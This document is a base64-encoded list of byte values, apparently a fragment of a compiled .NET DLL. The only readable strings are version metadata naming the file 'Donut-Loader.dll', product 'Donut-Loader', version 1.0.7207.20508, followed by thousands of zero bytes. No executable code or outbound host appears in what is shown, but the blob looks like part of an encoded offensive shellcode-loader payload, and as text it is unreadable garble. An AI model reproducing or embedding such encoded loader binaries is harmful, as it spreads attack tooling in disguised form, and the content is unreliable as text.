AsIDU2LCAyLCAwLCAwLCAxLCAwLCA0OCwgMCwgNDgsIDAsIDQ4LCAwLCA0OCwgMCwgNDgsIDAsIDUyLCAwLCA5OCwgMCwgNDgsIDAsIDAsIDAsIDY4LCAwLCAxMywgMCwgMSwgMCwgNzAsIDAsIDEwNSwgMCwgMTA4LCAwLCAxMDEsIDAsIDY4LCAwLCAxMDEsIDAsIDExNSwgMCwgOTksIDAsIDExNCwgMCwgMTA1LCAwLCAxMTIsIDAsIDExNiwgMCwgMTA1LCAwLCAxMTEsIDAsIDExMCwgMCwgMCwgMCwgMCwgMCwgNjgsIDAsIDExMSwgMCwgMTEwLCAwLCAxMTcsIDAsIDExNiwgMCwgNDUsIDAsIDc2LCAwLCAxMTEsIDAsIDk3LCAwLCAxMDAsIDAsIDEwMSwgMCwgMTE0LCAwLCAwLCAwLCAwLCAwLCA2NCwgMCwgMTUsIDAsIDEsIDAsIDcwLCAwLCAxMDUsIDAsIDEwOCwgMCwgMTAxLCAwLCA4NiwgMCwgMTAxLCAwLCAxMTQsIDAsIDExNSwgMCwgMTA1LCAwLCAxMTEsIDAsIDExMCwgMCwgMCwgMCwgMCwgMCwgNDksIDAsIDQ2LCAwLCA0OCwgMCwgNDYsIDAsIDU1LCAwLCA1MCwgMCwgNDgsIDAsIDU1LCAwLCA0NiwgMCwgNTAsIDAsIDQ4LCAwLCA1MywgMCwgNDgsIDAsIDU2LCAwLCAwLCAwLCAwLCAwLCA2OCwgMCwgMTcsIDAsIDEsIDAsIDczLCAwLCAxMTAsIDAsIDExNiwgMCwgMTAxLCAwLCAxMTQsIDAsIDExMCwgMCwgOTcsIDAsIDEwOCwgMCwgNzgsIDAsIDk3LCAwLCAxMDksIDAsIDEwMSwgMCwgMCwgMCwgNjgsIDAsIDExMSwgMCwgMTEwLCAwLCAxMTcsIDAsIDExNiwgMCwgNDUsIDAsIDc2LCAwLCAxMTEsIDAsIDk3LCAwLCAxMDAsIDAsIDEwMSwgMCwgMTE0LCAwLCA0NiwgMCwgMTAwLCAwLCAxMDgsIDAsIDEwOCwgMCwgMCwgMCwgMCwgMCwgNjgsIDAsIDE1LCAwLCAxLCAwLCA3NiwgMCwgMTAxLCAwLCAxMDMsIDAsIDk3LCAwLCAxMDgsIDAsIDY3LCAwLCAxMTEsIDAsIDExMiwgMCwgMTIxLCAwLCAxMTQsIDAsIDEwNSwgMCwgMTAzLCAwLCAxMDQsIDAsIDExNiwgMCwgMCwgMCwgNjcsIDAsIDExMSwgMCwgMTEyLCAwLCAxMjEsIDAsIDExNCwgMCwgMTA1LCAwLCAxMDMsIDAsIDEwNCwgMCwgMTE2LCAwLCAzMiwgMCwgNTAsIDAsIDQ4LCAwLCA0OSwgMCwgNTcsIDAsIDAsIDAsIDAsIDAsIDc2LCAwLCAxNywgMCwgMSwgMCwgNzksIDAsIDExNCwgMCwgMTA1LCAwLCAxMDMsIDAsIDEwNSwgMCwgMTEwLCAwLCA5NywgMCwgMTA4LCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgMTEwLCAwLCA5NywgMCwgMTA5LCAwLCAxMDEsIDAsIDAsIDAsIDY4LCAwLCAxMTEsIDAsIDExMCwgMCwgMTE3LCAwLCAxMTYsIDAsIDQ1LCAwLCA3NiwgMCwgMTExLCAwLCA5NywgMCwgMTAwLCAwLCAxMDEsIDAsIDExNCwgMCwgNDYsIDAsIDEwMCwgMCwgMTA4LCAwLCAxMDgsIDAsIDAsIDAsIDAsIDAsIDYwLCAwLCAxMywgMCwgMSwgMCwgODAsIDAsIDExNCwgMCwgMTExLCAwLCAxMDAsIDAsIDExNywgMCwgOTksIDAsIDExNiwgMCwgNzgsIDAsIDk3LCAwLCAxMDksIDAsIDEwMSwgMCwgMCwgMCwgMCwgMCwgNjgsIDAsIDExMSwgMCwgMTEwLCAwLCAxMTcsIDAsIDExNiwgMCwgNDUsIDAsIDc2LCAwLCAxMTEsIDAsIDk3LCAwLCAxMDAsIDAsIDEwMSwgMCwgMTE0LCAwLCAwLCAwLCAwLCAwLCA2OCwgMCwgMTUsIDAsIDEsIDAsIDgwLCAwLCAxMTQsIDAsIDExMSwgMCwgMTAwLCAwLCAxMTcsIDAsIDk5LCAwLCAxMTYsIDAsIDg2LCAwLCAxMDEsIDAsIDExNCwgMCwgMTE1LCAwLCAxMDUsIDAsIDExMSwgMCwgMTEwLCAwLCAwLCAwLCA0OSwgMCwgNDYsIDAsIDQ4LCAwLCA0NiwgMCwgNTUsIDAsIDUwLCAwLCA0OCwgMCwgNTUsIDAsIDQ2LCAwLCA1MCwgMCwgNDgsIDAsIDUzLCAwLCA0OCwgMCwgNTYsIDAsIDAsIDAsIDAsIDAsIDcyLCAwLCAxNSwgMCwgMSwgMCwgNjUsIDAsIDExNSwgMCwgMTE1LCAwLCAxMDEsIDAsIDEwOSwgMCwgOTgsIDAsIDEwOCwgMCwgMTIxLCAwLCAzMiwgMCwgODYsIDAsIDEwMSwgMCwgMTE0LCAwLCAxMTUsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDQ5LCAwLCA0NiwgMCwgNDgsIDAsIDQ2LCAwLCA1NSwgMCwgNTAsIDAsIDQ4LCAwLCA1NSwgMCwgNDYsIDAsIDUwLCAwLCA0OCwgMCwgNTMsIDAsIDQ4LCAwLCA1NiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCw